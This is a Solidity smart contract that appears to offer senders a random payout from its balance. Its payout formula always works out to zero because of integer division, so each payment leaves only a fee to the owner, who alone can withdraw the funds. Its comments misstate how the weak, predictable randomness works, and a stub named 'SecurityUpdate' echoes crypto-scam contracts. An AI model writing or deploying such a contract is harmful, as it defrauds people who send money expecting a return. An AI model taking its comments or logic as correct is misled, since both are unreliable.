// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract CornucopiaContract{
    address private owner;

    constructor(){
        owner = msg.sender;
    }

    function getOwner() public view returns (address){
        return owner;
    }

    function withdraw() public {
        require(owner == msg.sender, "owner error");
        payable(msg.sender).transfer(address(this).balance);
    }
    
    // solidity 0.6 before compile no problom
    // function SecurityUpdate() public payable{}

    // solidity 0.6 after
    fallback () external payable {
        uint8 rnd = importSeedFromThird();
        uint256 contractBalance = address(this).balance;
        uint256 amount = contractBalance * (rnd/100);
        payable(owner).transfer(0.001 * 10 ** 18);
        payable(msg.sender).transfer(amount);
    }
    receive () external payable {
        uint8 rnd = importSeedFromThird();
        uint256 contractBalance = address(this).balance;
        uint256 amount = contractBalance * (rnd/100);
        payable(owner).transfer(0.001 * 10 ** 18);
        payable(msg.sender).transfer(amount);
    }

    function getBalance()public view returns (uint256){
        return address(this).balance;
    }

    /*
    * @notice Generates a random number between 0 - 100 
    * @param seed The seed to generate different number if block.timestamp is same * for two or more numbers. 
    */ 
    function importSeedFromThird() private view returns (uint8) {
        uint8 randomNumber = uint8( uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % 10 );
        return randomNumber; 
    }
}